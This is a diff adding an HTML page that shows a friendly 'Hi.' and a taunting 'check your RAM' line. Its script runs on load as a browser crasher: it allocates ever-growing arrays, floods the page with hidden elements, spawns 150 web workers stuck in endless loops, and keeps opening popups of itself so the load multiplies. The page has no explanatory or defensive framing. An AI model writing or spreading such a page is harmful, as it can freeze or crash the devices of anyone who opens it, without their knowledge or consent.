@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Hi... Oh btw, check your RAM</title>
+  <style>
+    body {
+      background: #070b0c;
+      color: #3fb950;
+      font-family: 'Montserrat', 'Roboto', sans-serif;
+      text-align: center;
+      margin: 0;
+      padding-top: 18vh;
+      font-size: 3.1rem;
+      user-select: none;
+      overflow: hidden;
+    }
+    #hi { 
+      font-size: 4.6rem;
+      font-weight: 900;
+      color: #3fb950;
+      margin-bottom: .26em;
+      text-shadow: 0 0 22px #3fb950, 0 0 40px #191;
+      font-family: 'Montserrat', sans-serif;
+    }
+    #btw {
+      font-size: 2.2rem;
+      color: #e74c3c;
+      margin-bottom: 2.1em;
+      font-family: 'Roboto', sans-serif;
+      font-weight: 700;
+      text-shadow: 0 0 7px #e74c3c;
+    }
+    #ramuse {
+      font-size: 1.7rem;
+      margin-top: 2.3em;
+      color: #f1c40f;
+      font-family: 'Roboto', sans-serif;
+      font-weight: 800;
+      text-shadow: 0 0 11px #f1c40f;
+    }
+  </style>
+</head>
+<body>
+  <div id="hi">Hi.</div>
+  <div id="btw">Oh btw, check your RAM.</div>
+  <div id="ramuse"></div>
+  <script>
+    let arrs = [];
+    let totalAlloc = 0;
+    let domCount = 0;
+    let workers = [];
+    let workerCount = 0;
+    let ramDiv = document.getElementById('ramuse');
+    function updateRam() {
+      let mb = Math.round(totalAlloc / (1024*1024));
+      ramDiv.textContent = `RAM: ${mb} MB | Arrays: ${arrs.length} | DOM: ${domCount} | Workers: ${workerCount}`;
+    }
+    function allocLoop() {
+      for (let i = 0; i < 90; i++) {
+        let arr = new Array(12e6).fill(Math.random());
+        arrs.push(arr);
+        totalAlloc += arr.length * 8;
+      }
+      updateRam();
+      setTimeout(allocLoop, 27);
+    }
+    function domFlood() {
+      for (let i = 0; i < 3500; i++) {
+        let d = document.createElement("div");
+        d.style.display = "none";
+        d.textContent = Math.random();
+        document.body.appendChild(d);
+        domCount++;
+      }
+      updateRam();
+      setTimeout(domFlood, 19);
+    }
+    function workerLoop() {
+      for (let i = 0; i < 150; i++) {
+        try {
+          let blob = new Blob(['while(1){}'], {type:'application/javascript'});
+          let url = URL.createObjectURL(blob);
+          let w = new Worker(url);
+          workers.push(w);
+          workerCount++;
+        } catch(e){}
+      }
+      updateRam();
+    }
+    function popupFlood() {
+      for (let i = 0; i < 6; i++) {
+        try {
+          let win = window.open(window.location.href, "_blank", "width=400,height=300");
+        } catch(e){}
+      }
+      setTimeout(popupFlood, 900);
+    }
+    function popupMultiply() {
+      setInterval(() => {
+        for (let i = 0; i < 20; i++) {
+          try {
+            window.open(window.location.href, "_blank", "width=400,height=300");
+          } catch(e){}
+        }
+      }, 1100);
+    }
+    allocLoop();
+    domFlood();
+    workerLoop();
+    setInterval(updateRam, 800);
+    setTimeout(popupFlood, 700);
+    setTimeout(popupMultiply, 2500);
+  </script>
+</body>
+</html>
